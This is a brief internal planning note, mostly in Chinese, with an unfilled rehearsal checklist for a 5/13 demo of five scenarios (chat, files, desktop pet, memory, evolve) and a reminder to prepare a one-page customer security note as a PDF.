- 客户安全说明 1 页 (5/12 前出 PDF)

---

## 5/13 rehearsal 记录表

| 场景 | 第 1 轮 | 第 2 轮 | 关键问题 |
|---|---|---|---|
| 1 chat | ☐ | ☐ | |
| 2 文件 | ☐ | ☐ | |
| 3 桌宠 | ☐ | ☐ | |
| 4 记忆 | ☐ | ☐ | |
| 5 evolve | ☐ | ☐ | |

每场后填: 时长是否在范围 / 失败点 / fallback 触发情况.
